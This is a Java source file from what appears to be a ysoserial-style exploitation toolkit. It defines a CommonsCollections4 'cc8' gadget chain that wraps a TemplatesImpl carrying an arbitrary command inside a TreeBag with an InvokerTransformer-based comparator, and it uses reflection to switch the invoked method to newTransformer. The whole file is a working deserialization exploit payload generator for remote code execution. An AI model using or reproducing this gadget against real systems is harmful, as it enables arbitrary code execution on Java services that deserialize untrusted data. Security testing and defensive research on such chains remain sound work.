package com.qi4l.JYso.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.qi4l.JYso.gadgets.utils.jdk17Bypass;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.swing.event.EventListenerList;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Comparator;


@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"navalorenzo"})
public class cc8 implements ObjectPayload<TreeBag> {

    public TreeBag getObject(String command) throws Exception {
        final Object           templates   = Gadgets.createTemplatesImpl(command);

        InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
        TreeBag                tree        = new TreeBag((Comparator) comp);
        tree.add(templates);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return tree;
    }
}
